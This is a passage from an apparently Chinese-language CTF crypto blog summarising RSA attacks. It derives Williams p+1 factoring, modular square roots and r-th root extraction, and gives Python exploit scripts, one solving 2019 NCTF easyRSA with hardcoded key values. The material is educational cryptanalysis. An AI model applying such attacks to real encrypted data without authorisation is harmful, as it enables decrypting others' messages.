class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">prime = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span>,<span class="number">211</span>,<span class="number">223</span>,<span class="number">227</span>,<span class="number">229</span>,<span class="number">233</span>,<span class="number">239</span>,<span class="number">241</span>,<span class="number">251</span>,<span class="number">257</span>,<span class="number">263</span>,<span class="number">269</span>,<span class="number">271</span>,<span class="number">277</span>,<span class="number">281</span>,<span class="number">283</span>,<span class="number">293</span>,<span class="number">307</span>,<span class="number">311</span>,<span class="number">313</span>,<span class="number">317</span>,<span class="number">331</span>,<span class="number">337</span>,<span class="number">347</span>,<span class="number">349</span>,<span class="number">353</span>,<span class="number">359</span>,<span class="number">367</span>,<span class="number">373</span>,<span class="number">379</span>,<span class="number">383</span>,<span class="number">389</span>,<span class="number">397</span>,<span class="number">401</span>,<span class="number">409</span>,<span class="number">419</span>,<span class="number">421</span>,<span class="number">431</span>,<span class="number">433</span>,<span class="number">439</span>,<span class="number">443</span>,<span class="number">449</span>,<span class="number">457</span>,<span class="number">461</span>,<span class="number">463</span>,<span class="number">467</span>,<span class="number">479</span>,<span class="number">487</span>,<span class="number">491</span>,<span class="number">499</span>,<span class="number">503</span>,<span class="number">509</span>,<span class="number">521</span>,<span class="number">523</span>,<span class="number">541</span>,<span class="number">547</span>,<span class="number">557</span>,<span class="number">563</span>,<span class="number">569</span>,<span class="number">571</span>,<span class="number">577</span>,<span class="number">587</span>,<span class="number">593</span>,<span class="number">599</span>,<span class="number">601</span>,<span class="number">607</span>,<span class="number">613</span>,<span class="number">617</span>,<span class="number">619</span>,<span class="number">631</span>,<span class="number">641</span>,<span class="number">643</span>,<span class="number">647</span>,<span class="number">653</span>,<span class="number">659</span>,<span class="number">661</span>,<span class="number">673</span>,<span class="number">677</span>,<span class="number">683</span>,<span class="number">691</span>,<span class="number">701</span>,<span class="number">709</span>,<span class="number">719</span>,<span class="number">727</span>,<span class="number">733</span>,<span class="number">739</span>,<span class="number">743</span>,<span class="number">751</span>,<span class="number">757</span>,<span class="number">761</span>,<span class="number">769</span>,<span class="number">773</span>,<span class="number">787</span>,<span class="number">797</span>,<span class="number">809</span>,<span class="number">811</span>,<span class="number">821</span>,<span class="number">823</span>,<span class="number">827</span>,<span class="number">829</span>,<span class="number">839</span>,<span class="number">853</span>,<span class="number">857</span>,<span class="number">859</span>,<span class="number">863</span>,<span class="number">877</span>,<span class="number">881</span>,<span class="number">883</span>,<span class="number">887</span>,<span class="number">907</span>,<span class="number">911</span>,<span class="number">919</span>,<span class="number">929</span>,<span class="number">937</span>,<span class="number">941</span>,<span class="number">947</span>,<span class="number">953</span>,<span class="number">967</span>,<span class="number">971</span>,<span class="number">977</span>,<span class="number">983</span>,<span class="number">991</span>,<span class="number">997</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Lucas_pow</span><span class="params">(P, R)</span>:</span></span><br><span class="line">    A, B = P, <span class="number">2</span></span><br><span class="line">    R = bin(R)[<span class="number">3</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> R:</span><br><span class="line">        <span class="keyword">if</span> int(i) == <span class="number">1</span>:</span><br><span class="line">            A, B = (P * A**<span class="number">2</span> - A * B - P) % n, (A**<span class="number">2</span> - <span class="number">2</span>) % n</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            A, B = (A**<span class="number">2</span> - <span class="number">2</span>) % n, (A * B - P) % n</span><br><span class="line">    <span class="keyword">return</span> gcd(A - <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Williams_p_1</span><span class="params">()</span>:</span></span><br><span class="line">    R = <span class="number">1</span></span><br><span class="line">    B = iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    B = log(B)</span><br><span class="line">    <span class="keyword">for</span> pi <span class="keyword">in</span> prime:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(B//log(pi)):</span><br><span class="line">            R *= pi</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        P = random.randint(<span class="number">2</span>, B)</span><br><span class="line">        p = Lucas_pow(P, R)</span><br><span class="line">        <span class="keyword">if</span> p &gt; <span class="number">1</span> <span class="keyword">and</span> p &lt; n:</span><br><span class="line">            <span class="keyword">return</span> p</span><br></pre></td></tr></table></figure><p>可以看到上述算法的R选取和先前选的m!不同，且采用<span class="math inline">\(V_{f}\rightarrow V_{2f}\)</span>的跨度进行递推.</p><p>实验发现在p+1的小素数因子上限B已知时，采取上述方法会明显快一些（当然也可以求出该方法中的R，再通项直接求R，大约5s就能出）.</p><h4 id="link">Link</h4><p><a href="https://math.boisestate.edu/~liljanab/BOISECRYPTFall09/Sundling.pdf" target="_blank" rel="noopener">https://math.boisestate.edu/~liljanab/BOISECRYPTFall09/Sundling.pdf</a></p><p><a href="https://www.ams.org/journals/mcom/1982-39-159/S0025-5718-1982-0658227-7/S0025-5718-1982-0658227-7.pdf" target="_blank" rel="noopener">https://www.ams.org/journals/mcom/1982-39-159/S0025-5718-1982-0658227-7/S0025-5718-1982-0658227-7.pdf</a></p><h3 id="rsa---square-root-in-f_p">RSA - Square Root in <span class="math inline">\(F_{p}\)</span></h3><h4 id="theorem-15">Theorem</h4><p>Given <span class="math inline">\(b^{2}\equiv a(mod\ p)\)</span></p><ul><li><p>Case 1：<span class="math inline">\(p\equiv 3(mod\ 4)\rightarrow b:=\pm a^{\frac{p+1}{4}}(mod\ p)\)</span></p></li><li><p>Case 2：Cipolla's algorithm（一般性）</p><ul><li><p>Step 1：在<span class="math inline">\(F_{p}\)</span>上找到一个t，使得<span class="math inline">\(u:=t^{2}-a\)</span>是一个模p的平方非剩余（因为平方非剩余的概率趋于1/2，所以随机选取并用欧拉判别即可）</p></li><li><p>Step 2：定义<span class="math inline">\(F_{p^{2}}=F_{p}(\sqrt{t^{2}-a})=\\{x+y\sqrt{t^{2}-a}:x,y\in F_{p}\\}\)</span>，关于<span class="math inline">\(F_{p^{2}}\)</span>是域的证明此处略. （当然，<span class="math inline">\(\omega:=\sqrt{t^{2}-a}\)</span>在<span class="math inline">\(F_{p}\)</span>上不存在，因此类似虚数存在）.先来证明两个引理：(1) <span class="math inline">\((x+y\omega)^{p}=\sum_{i=0}^{p}C_{p}^{i}x^{p-i}(y\omega)^{i}\)</span>，因为u是平方非剩余，所以<span class="math inline">\(\omega^{p-1}=(\omega^{2})^{\frac{p-1}{2}}=u^{\frac{p-1}{2}}=-1\)</span>. 且p均整除二项式展开中间系数，上式可转化为<span class="math inline">\(x^{p}+y^{p}\omega^{p}(费马小定理)=x+y\omega^{p}=x-y\omega\)</span>.；(2) <span class="math inline">\(((t+\omega)^{\frac{p+1}{2}})^{2}=(t+\omega)^{p+1}=(t+\omega)(t-\omega)=t^{2}-\omega^{2}=a\)</span>.</p><p>所以计算<span class="math inline">\((t+\omega)^{\frac{p+1}{2}}\)</span>即为二次根b.</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-17_17-12-37.png"></p></li></ul></li><li><p>Case 3：Atkin’s algorithm（<span class="math inline">\(p\equiv 5(mod\ 8)\)</span>）</p><p><span class="math inline">\(c\leftarrow (2a)^{\frac{p-5}{8}}\)</span></p><p><span class="math inline">\(i\leftarrow 2ac^{2}\)</span></p><p><span class="math inline">\(b\leftarrow ac(i-1)\)</span></p></li></ul><h4 id="exp-14">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">euler_judge</span><span class="params">(x, p)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> pow(x, (p - <span class="number">1</span>) // <span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow_in_Fp2</span><span class="params">(a, b, n, p)</span>:</span>  <span class="comment"># (a+sqrt(b))^n in Fp^2</span></span><br><span class="line">    states = [(a % p, <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(math.log(n, <span class="number">2</span>))):</span><br><span class="line">        new_state = ((pow(states[i][<span class="number">0</span>], <span class="number">2</span>, p) + b * pow(states[i][<span class="number">1</span>], <span class="number">2</span>, p)) %</span><br><span class="line">                     p, (<span class="number">2</span> * states[i][<span class="number">0</span>] * states[i][<span class="number">1</span>]) % p)</span><br><span class="line">        states.append(new_state)</span><br><span class="line">    n_bin = bin(n)[<span class="number">2</span>:][::<span class="number">-1</span>]</span><br><span class="line">    res_x = <span class="number">1</span></span><br><span class="line">    res_y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(n_bin)):</span><br><span class="line">        <span class="keyword">if</span> n_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">            res_x, res_y = (res_x * states[i][<span class="number">0</span>] + res_y * states[i][<span class="number">1</span>]</span><br><span class="line">                            * b) % p, (res_x * states[i][<span class="number">1</span>] + res_y * states[i][<span class="number">0</span>]) % p</span><br><span class="line">    <span class="keyword">return</span> res_x, res_y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square_root</span><span class="params">(a, p)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(euler_judge(a, p) == <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        b = pow(a, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    <span class="keyword">elif</span> p % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">        c = pow(<span class="number">2</span> * a, (p - <span class="number">5</span>) // <span class="number">8</span>, p)</span><br><span class="line">        i = (<span class="number">2</span> * a * c**<span class="number">2</span>) % p</span><br><span class="line">        b = (a * c * (i - <span class="number">1</span>)) % p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = getRandomRange(<span class="number">1</span>, p)</span><br><span class="line">        u = t**<span class="number">2</span> - a</span><br><span class="line">        <span class="keyword">while</span> euler_judge(u, p):</span><br><span class="line">            t = getRandomRange(<span class="number">1</span>, p)</span><br><span class="line">            u = t**<span class="number">2</span> - a</span><br><span class="line">        b, check = pow_in_Fp2(t, u, (p + <span class="number">1</span>) // <span class="number">2</span>, p)</span><br><span class="line">        <span class="keyword">assert</span>(check == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> b, -b % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    root = square_root(<span class="number">19</span>, <span class="number">65537</span>)</span><br><span class="line">    print(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="more-2">More</h4><p>有限域下的n-th root其实在sympy中也有函数处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">x = nthroot_mod(a, <span class="number">2</span>, p, all_roots=<span class="literal">False</span>) <span class="comment">#求二次根</span></span><br></pre></td></tr></table></figure><p>但p和n过大时，nthroot_mod在有限域上求解也会变得极其困难，因此下面再做一个该类型的拓展.</p><h3 id="rsa---emid-p-1emid-q-1">RSA - <span class="math inline">\(e\mid (p-1),e\mid (q-1)\)</span></h3><h4 id="theorem-16">Theorem</h4><p>前面提到过<span class="math inline">\(gcd(e,\varphi(n))\neq 1\)</span>的情况，但不针对<span class="math inline">\(gcd(e,\varphi(n))=e\)</span>，于是这里就对<span class="math inline">\(e\mid (p-1),e\mid (q-1)\)</span>的特殊情况进行讨论.</p><p>解题思路即求解m mod p和m mod q，再通过CRT还原m mod n. 主要难点则是在<span class="math inline">\(GF(p)\)</span>上求e次根.</p><p>在有限域上求r-th root有两个常见算法（Adleman-Manders-Miller algorithm和Cipolla-Lehmer algorithm），但这里介绍的是Namhun Koo提出的一种更具一般性的开根算法，且在s足够小的时候更高效（<span class="math inline">\(r^{s}\mid (p-1),r^{s}\nmid (p-1)\)</span>）.</p><ul><li><strong>New r-th root extraction formula over <span class="math inline">\(F_{q}\)</span> for <span class="math inline">\(q\equiv lr^{s}+1(mod\ r^{s+1})\)</span> and r is a prime</strong></li></ul><p><strong>[Theorem 1]</strong></p><p>设c是在<span class="math inline">\(F_q\)</span>上的一个r次剩余，则<span class="math inline">\(\exists b\in F_{q},s.t.\ ord_{q}(c^{r-1}b^{r})=r^{t}.(0\leq t&lt;s)\)</span></p><p>Proof：</p><p><span class="math inline">\(\because gcd(r,l)=1\quad \therefore\exists(\alpha,\beta),s.t.\ r\beta +r-1=l\alpha\)</span>.</p><p><span class="math inline">\(\alpha =\frac{r\beta +r-1}{l}\)</span>，令<span class="math inline">\(\zeta=(c^{\alpha})^{\frac{q-1}{r^{s}}}=(c^{\alpha})^{\frac{q-1}{r^{s}}}c^{r\beta +r-1-l\alpha}=c^{r-1}(c^{\beta+\alpha\frac{q-1-lr^{s}}{r^{s+1}}})^{r}=c^{r-1}b^{r}\)</span>.</p><p><span class="math inline">\(\because c\)</span>是<span class="math inline">\(F_{q}\)</span>上的r次剩余，且指数含<span class="math inline">\(\frac{q-1}{r^{s}}\)</span>，则<span class="math inline">\(ord_{q}(\zeta)=r^{t}.(t&lt;s)\)</span></p><p>则由Theorem 1，我们令<span class="math inline">\(\xi\)</span>为<span class="math inline">\(F_{q}\)</span>上的一<span class="math inline">\(r^{s}\)</span>阶单位根，要取符合要求的<span class="math inline">\(\xi\)</span>，我们可以使得<span class="math inline">\(\xi=d^{\frac{q-1}{r^{s}}}\)</span>，其中d为模q的r次非剩余（概率约为<span class="math inline">\(\frac{r-1}{r}\)</span>）.</p><p>则存在唯一的<span class="math inline">\((i,j)\)</span>，使得<span class="math inline">\(\xi^{r^{s-t}}=\zeta^{i},\zeta=(\xi^{r^{s-t}})^j\)</span>，即<span class="math inline">\(ij\equiv 1(mod\ r^{t})\)</span>.</p><p><strong>[Theorem 2]</strong></p><p>令<span class="math inline">\(u\equiv j(r^{t}-1)r^{s-t-1}\equiv -jr^{s-t-1}(mod\ r^{s-1})\)</span>，则<span class="math inline">\(F_{q}\)</span>下c的一个r次根即为<span class="math inline">\(cb\xi^{u}\)</span>，b在Theorem 1中已给出定义.</p><p>Proof：</p><p><span class="math inline">\((cb\xi^{u})^{r}=cc^{r-1}b^{r}\xi^{ur}=c\zeta\xi^{ur}\)</span>.</p><p><span class="math inline">\(\because u=j(r^{t}-1)r^{s-t-1}+kr^{s-1},\xi^{r^{s}}=1.\)</span></p><p><span class="math inline">\(\therefore \zeta\xi^{ur}=(\xi^{r^{s-t}})^{j}\xi^{ur}=\xi^{jr^{s-t}+ur}=\xi^{jr^{s-t}+kr^{s}+j(r^{t}-1)r^{s-t}}=\xi^{jr^{s}}=1.\)</span></p><p><span class="math inline">\(\therefore (cb\xi^{u})^{r}=c.\)</span></p><p><strong>[Remark 1]</strong></p><p>Theorem里的<span class="math inline">\(r\beta +r-1=l\alpha\)</span>确定的<span class="math inline">\(\alpha\)</span> mod r和<span class="math inline">\(\beta\)</span> mod l是唯一的. 且上式可以扩展到<span class="math inline">\(\frac{q-1}{r}\)</span>的模域上（<span class="math inline">\(r\beta + r-1\equiv l\alpha(mod\ \frac{q-1}{r})\)</span>），因为c是<span class="math inline">\(F_{q}\)</span>上的r次剩余，即<span class="math inline">\(c^{\frac{q-1}{r}}=1\)</span>.</p><p><strong>[Remark 2]</strong></p><p><span class="math inline">\(cb=c^{\beta+1+\alpha\frac{q-1-lr^{s}}{r^{s+1}}}=c^{\frac{(\beta+1)r^{s+1}+\alpha(q-1)-\alpha lr^{s}}{r^{s+1}}}=c^{\frac{r^{s}((\beta+1)r-\alpha l)+\alpha(q-1)}{r^{s+1}}}=c^{\frac{1+\frac{\alpha(q-1)}{r^{s}}}{r}}.\)</span></p><p><strong>[Remark 3]</strong></p><p>Theorem 1结尾提到的<span class="math inline">\((i,j)\)</span>在<span class="math inline">\(r^{t}\)</span>较大时求解困难，因此本方法在r和t过大时并不高效.</p><p><strong>[利用]</strong></p><ul><li><p>s = 1时（即<span class="math inline">\(q\equiv lr+1(mod\ r^{2})\)</span>时）</p><p><span class="math inline">\(\because t&lt;s\quad\therefore t=0,u=0.\)</span></p><p><span class="math inline">\(cb\xi^{u}=cb\)</span>即为一个满足要求的r次根.</p><p>由Remark 3知，<span class="math inline">\(cb=c^{\frac{1+\frac{\alpha(q-1)}{r^{s}}}{r}}=c^{\frac{1+\frac{\alpha(q-1)}{r}}{r}}\)</span>，至于<span class="math inline">\(\alpha\)</span>可以通过扩展欧几里得算法很轻易得到.</p></li><li><p>s &gt; 1时，t可能落在{0, ..., s - 1}上，因此分析时要分的情况会多不少（在这里就不占篇幅去写了，paper链接会在Link中给出）</p></li><li><p>上述算法给出的只是<span class="math inline">\(G_{q}\)</span>上c的其中一个r次根，但要找出所有的r次根也很简单，只要借助r次单位根即可</p><p><span class="math inline">\(G_{q}\)</span>上的r次单位根(<span class="math inline">\(r\mid (q-1)\)</span>)为{<span class="math inline">\(x^{i(\frac{q-1}{r})}\)</span>}(<span class="math inline">\(i\in[0,q)\)</span>), 我们取一个不为1的r次单位根与我们先前找到的特解生成一个r阶循环群即找到通解.</p></li></ul><h4 id="exp-15">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rthroot</span><span class="params">(c, r, q)</span>:</span></span><br><span class="line">    c %= q</span><br><span class="line">    <span class="keyword">assert</span>(isPrime(r) <span class="keyword">and</span> (q - <span class="number">1</span>) % r == <span class="number">0</span> <span class="keyword">and</span> (q - <span class="number">1</span>) % (r**<span class="number">2</span>) != <span class="number">0</span>)</span><br><span class="line">    l = ((q - <span class="number">1</span>) % (r**<span class="number">2</span>)) // r</span><br><span class="line">    alpha = (-inverse(l, r)) % r</span><br><span class="line">    root = pow(c, ((<span class="number">1</span> + alpha * (q - <span class="number">1</span>) // r) // r), q)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allroot</span><span class="params">(r, q, root)</span>:</span></span><br><span class="line">    all_root = set()</span><br><span class="line">    all_root.add(root)</span><br><span class="line">    <span class="keyword">while</span> len(all_root) &lt; r:</span><br><span class="line">        new_root = root</span><br><span class="line">        unity = pow(getRandomRange(<span class="number">2</span>, q), (q - <span class="number">1</span>) // r, q)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            new_root = (new_root * unity) % q</span><br><span class="line">            all_root.add(new_root)</span><br><span class="line">    <span class="keyword">return</span> all_root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def crt(ai, mi):</span></span><br><span class="line"><span class="string">    a1, m1 = ai[0], mi[0]</span></span><br><span class="line"><span class="string">    a2, m2 = ai[1], mi[1]</span></span><br><span class="line"><span class="string">    return (a1 * inverse(m2, m1) * m2 + a2 * inverse(m1, m2) * m1) % (m1 * m2)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(proot, qroot, p, q)</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    total = len(proot) * len(qroot)</span><br><span class="line">    step = total // <span class="number">100</span></span><br><span class="line">    t1 = inverse(q, p)</span><br><span class="line">    t2 = inverse(p, q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> proot:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> qroot:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count % step == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">'\r&#123;&#125;%'</span>.format(count // step), end=<span class="string">''</span>)</span><br><span class="line">            <span class="comment">#root = (i, j)</span></span><br><span class="line">            <span class="comment">#m = crt(root, (p, q))</span></span><br><span class="line">            m = (i * t1 * q + j * t2 * p) % (p * q)</span><br><span class="line">            <span class="keyword">if</span> unhexlify(hex(m)[<span class="number">2</span>:<span class="number">10</span>]) == <span class="string">b'NCTF'</span>:</span><br><span class="line">                print(<span class="string">'\n'</span>, long_to_bytes(m))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">    q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">    e = <span class="number">0x1337</span></span><br><span class="line">    c = <span class="number">10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span></span><br><span class="line">    print(<span class="string">'[+] Calculating e-th root...'</span>)</span><br><span class="line">    start = time.clock()</span><br><span class="line">    proot = rthroot(c, e, p)</span><br><span class="line">    qroot = rthroot(c, e, q)</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'[*] Cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">    print(<span class="string">'[+] Calculating all e-th roots...'</span>)</span><br><span class="line">    start = time.clock()</span><br><span class="line">    all_proot = allroot(e, p, proot)</span><br><span class="line">    all_qroot = allroot(e, q, qroot)</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'[*] Cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">    print(<span class="string">'[+] CRT cracking...'</span>)</span><br><span class="line">    start = time.clock()</span><br><span class="line">    decrypt(all_proot, all_qroot, p, q)</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'[*] Cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="more-3">More</h4><p>exp对应2019-NCTF-easyRSA.</p><p>做完以后去找了官方wp，发现预期解是Adleman-Manders-Miller algorithm，这里给出链接</p><p><a href="http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa" target="_blank" rel="noopener">http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa</a></p><p>[注]</p><p>exp第一次调试的时候发现速度很慢-.-后来发现是大量crt的调用使得计算了接近<span class="math inline">\(e^{2}\)</span>次的inverse(p, q)和inverse(q,p)，因此将这两个crt中用到的变量锁定即可.</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/Snipaste_2020-03-25_09-54-37.png"></p><h4 id="link-1">Link</h4><p><a href="https://eprint.iacr.org/2013/117.pdf" target="_blank" rel="noopener">https://eprint.iacr.org/2013/117.pdf</a></p><p><a href="https://arxiv.org/pdf/1111.4877.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1111.4877.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ByteCTF2019] - boring_code</title>
      <link href="/2019/10/22/ByteCTF2019-boring-code/"/>
      <url>/2019/10/22/ByteCTF2019-boring-code/</url>
      
